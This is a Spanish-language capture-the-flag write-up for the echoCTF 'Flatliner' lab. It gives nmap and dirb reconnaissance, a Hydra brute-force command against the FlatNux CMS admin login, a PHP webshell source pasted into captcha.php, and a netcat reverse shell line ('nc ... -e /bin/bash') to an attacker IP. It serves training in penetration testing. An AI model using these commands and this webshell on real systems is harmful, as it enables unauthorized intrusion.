@@ -1,0 +1,179 @@
+
+<link rel="stylesheet" href="../assets/css/styles.css">
+<h2>Plataforma echoCTF: Flatliner</h2>
+
+<div style="flex: 0.75;">
+    <p>Para esta práctica se utilizó la plataforma <strong>echoCTF</strong>, un entorno dedicado al despliegue de laboratorios de seguridad informática y desafíos de tipo Capture The Flag (CTF). En particular, se trabajó con el laboratorio <a href="https://echoctf.red/target/292">Flatliner</a>, disponible en dicha plataforma. Este escenario asigna la dirección IP <code>10.0.160.224</code> como objetivo. Para la práctica se establecerá como objetivo conseguir una shell de dicha máquina.</p>
+</div>
+
+
+<img class="img_practicas" src="../assets/images/flatliner/flatliner.png" alt="Flatliner">
+
+<p>La máquina objetivo cuenta con <strong>dos servicios activos</strong> y <strong>cuatro banderas</strong>, las cuales indicarán el progreso en la escalada de privilegios y exploración del sistema.</p>
+
+<h2>Escaneo de puertos con Nmap</h2>
+<p>Como primer paso, se realizó un escaneo de servicios utilizando la herramienta <code>nmap</code>. El comando empleado fue:</p>
+<pre>nmap -sV 10.0.160.224</pre>
+<p>Este comando permite identificar los puertos abiertos y los servicios asociados en la dirección IP <code>10.0.160.224</code>. El parámetro <code>-sV</code> especifica que se debe realizar una detección de versiones para obtener más información sobre los servicios encontrados.</p>
+
+<img style="display: block;width: 100%;height: auto;max-width: 900px;margin: 0 auto;" class="img_practicas" src="../assets/images/flatliner/nmap_flatliner.png" alt="Nmap Flatliner">
+
+<p>En este punto, se identificó que el puerto <strong>22</strong> está siendo utilizado por el servicio <code>SSH</code>, lo cual indica que podría estar disponible para acceso remoto. Sin embargo, no tenemos ningún usuario o llave privada para acceder.</p>
+
+<h2>Reconocimiento del servicio web</h2>
+<p>En contraparte, el puerto <strong>80</strong> parece estar ejecutando un servicio web sobre <code>Apache</code>. Entonces, este puede ser un punto por el cual podamos tener acceso a una webshell, por lo que verificaremos el servicio accediendo mediante un navegador web. Una vez abriendo en el navegador el contenido que tiene la máquina observamos lo siguiente:</p>
+
+<img class="img_practicas" src="../assets/images/flatliner/home_page_flatliner.png" alt="Home Page Flatliner">
+
+<p>Parece ser una página de prueba sobre "FlatNux", buscando encontramos que es un CMS (Content Management System) con base de datos textual fácilmente personalizable.</p>
+
+<h2>Enumeración de directorios con dirb</h2>
+<p>Para continuar con la fase de reconocimiento, se empleó la herramienta <code>dirb</code>, con el objetivo de realizar <em>fuzzing</em> y descubrir posibles directorios expuestos que pudieran ser de utilidad para el análisis. El comando utilizado fue:</p>
+<pre>dirb http://10.0.160.224/ -S</pre>
+<p>Este comando permite listar rutas accesibles en el servidor web especificado, suprimiendo los códigos de estado no relevantes gracias a la opción <code>-S</code>. Para esto <code>dirb</code> usa una lista de posibles directorios si no se especifica una.</p>
+
+<img class="img_practicas" src="../assets/images/flatliner/fuzzing.png" alt="Fuzzing Directorios">
+<p>Como resultado, se identificaron los siguientes directorios:</p>
+<ul>
+    <li><code>blocks</code></li>
+    <li><code>extra</code></li>
+    <li><code>images</code></li>
+    <li><code>include</code></li>
+    <li><code>languages</code></li>
+    <li><code>misc</code></li>
+    <li><code>themes</code></li>
+    <li><code>modules</code></li>
+    <li><code>plugins</code></li>
+    <li><code>sections</code></li>
+</ul>
+
+<h2>Exploración en el servicio web</h2>
+<p>Al explorar el sitio web, se observa que la página principal actúa como una demo y redirige al usuario hacia un <strong>panel de control</strong> debido a que no está configurado completamente.</p>
+
+<img class="img_practicas" src="../assets/images/flatliner/home.png" alt="Home">
+<img class="img_practicas" src="../assets/images/flatliner/panel_control.png" alt="Panel Control">
+
+<p>También se identificó una sección de <strong>noticias</strong>, la cual a simple vista no contiene información relevante.</p>
+<img class="img_practicas" src="../assets/images/flatliner/news.png" alt="Noticias">
+
+<p>Sin embargo, se observó un acceso a un <code>login</code> y una funcionalidad de <code>search</code>.</p>
+<img class="img_practicas" src="../assets/images/flatliner/login.png" alt="Login" style="width:70%;">
+<img class="img_practicas" src="../assets/images/flatliner/search.png" alt="Search" style="width:70%;">
+
+<p>El reto consiste en obtener acceso a una <strong>terminal</strong> dentro del sistema. En este punto, se identifican dos posibles vectores para lograrlo:</p>
+<ol>
+    <li>A través del formulario de inicio de sesión ubicado en el <em>panel de control</em>.</li>
+    <li>Mediante la carga de una imagen que contenga código <code>PHP</code>, aprovechando la funcionalidad de creación de perfil y ver múltiples reportes en <code>Exploit-DB</code>.</li>
+</ol>
+
+<h2>Selección del vector de ataque</h2>
+<p>Para esta práctica se optará por el primer enfoque, acceder mediante el formulario de <code>login</code>. Para ello, se utilizará la herramienta <code>Hydra</code>.</p>
+
+<h2>Verificación de usuarios existentes</h2>
+<p>El primero que se intentó fue el más simple: <code>admin</code>. Para verificar si este usuario existe, se accedió a la sección de <code>register</code>, se intentó registrarse con dicho nombre y el sistema respondió con un mensaje confirmando que <code>admin</code> ya se encuentra registrado:</p>
+<img class="img_practicas" src="../assets/images/flatliner/register_admin.png" alt="Register Admin">
+
+<p>Para las contraseñas, se podrían emplear listas como las disponibles en el <a href="https://github.com/josuamarcelc/common-password-list">repositorio rockyou.txt</a>. Se limitará a un conjunto reducido de intentos:</p>
+<ul>
+    <li><code>admin123</code></li>
+    <li><code>password</code></li>
+    <li><code>password123</code></li>
+    <li><code>admin124</code></li>
+    <li><code>admin123456</code></li>
+    <li><code>admin1</code></li>
+    <li><code>admin12</code></li>
+    <li><code>admin123</code></li>
+    <li><code>admin1234</code></li>
+    <li><code>admin12345</code></li>
+    <li><code>flatime</code></li>
+    <li><code>flatnux</code></li>
+    <li><code>flatliner</code></li>
+</ul>
+
+<h2>Análisis del login</h2>
+<p>Se replicó la petición POST con <code>Hydra</code> sin usar herramientas de interceptación.</p>
+
+<img class="img_practicas" src="../assets/images/flatliner/post_failure.png" alt="POST Failure">
+<img class="img_practicas" src="../assets/images/flatliner/post_control.png" alt="POST Control">
+
+<p>El formulario envía <code>username</code>, <code>password</code> y <code>rememberlogin</code>. Hydra permite replicar esto con el módulo <code>http-post-form</code>.</p>
+
+<h2>Ataque de fuerza bruta con Hydra</h2>
+<pre>
+hydra -l admin -P lista_practica 10.0.160.224 http-post-form 
+    "/controlcenter.php?&fnlogin=login:username=^USER^&password=^PASS^&rememberlogin=1:Authentication failure" -v
+</pre>
+
+<p>Donde cada parte significa:</p>
+<ul>
+    <li><code>-l admin</code>: usuario a usar.</li>
+    <li><code>-P lista_practica</code>: archivo con posibles contraseñas.</li>
+    <li><code>10.0.160.224</code>: IP objetivo.</li>
+    <li><code>http-post-form</code>: módulo POST.</li>
+    <li><code>/controlcenter.php?&fnlogin=login</code>: ruta del formulario.</li>
+    <li><code>username=^USER^&password=^PASS^&rememberlogin=1</code>: parámetros a enviar.</li>
+    <li><code>Authentication failure</code>: texto para detectar fallo.</li>
+    <li><code>-v</code>: modo verbose.</li>
+</ul>
+
+<img class="img_practicas" src="../assets/images/flatliner/hydra_intento.png" alt="Hydra Intento">
+
+<p>Tras el uso de Hydra, se descubrió que la contraseña era <strong>flatnux</strong>.</p>
+
+<h2>Acceso al panel de control</h2>
+<img class="img_practicas" src="../assets/images/flatliner/panel_admin.png" alt="Panel Admin">
+
+<p>Se identificaron errores en la página desarrollada en PHP:</p>
+<img class="img_practicas" src="../assets/images/flatliner/error_control.png" alt="Error Control">
+
+<p>Se exploró el directorio <code>files</code> en busca de un archivo para insertar la reverse shell:</p>
+<img class="img_practicas" src="../assets/images/flatliner/files.png" alt="Files">
+
+<p>Se seleccionó <code>captcha.php</code> para la reverse shell:</p>
+<img class="img_practicas" src="../assets/images/flatliner/capcha_edit.png" alt="Captcha Edit">
+
+<h2>Carga de webshell</h2>
+<pre>
+&lt;html&gt;
+&lt;body&gt;
+&lt;form method="GET" name="&lt;?php echo basename($_SERVER['PHP_SELF']); ?&gt;"&gt;
+    &lt;input type="TEXT" name="cmd" id="cmd" size="80"&gt;
+    &lt;input type="SUBMIT" value="Execute"&gt;
+&lt;/form&gt;
+
+&lt;?php
+if(isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?&gt;
+
+&lt;script&gt;document.getElementById("cmd").focus();&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</pre>
+
+
+<img class="img_practicas" src="../assets/images/flatliner/captcha_reverse.png" alt="Captcha Reverse">
+
+<p>Acceso a la ruta <code>/captcha.php</code> desde el navegador:</p>
+<img class="img_practicas" src="../assets/images/flatliner/reverse.png" alt="Web Shell">
+
+<h2>Reverse shell con Netcat</h2>
+<p>Comandos para establecer conexión:</p>
+<ul>
+    <li>Máquina atacante (escuchando):</li>
+</ul>
+<pre>nc -lvnp 4242</pre>
+
+<ul>
+    <li>Máquina objetivo:</li>
+</ul>
+<pre>nc 10.10.1.46 4242 -e /bin/bash</pre>
+
+<img class="img_practicas" src="../assets/images/flatliner/conexion.png" alt="Conexion">
+
+<p>Para mejorar la terminal remota:</p>
+<pre>python3 -c 'import pty; pty.spawn("/bin/bash")'</pre>
+
+<img class="img_practicas" src="../assets/images/flatliner/final.png" alt="Final">
+<p>Es así como se obtuvo acceso a la máquina objetivo.</p>
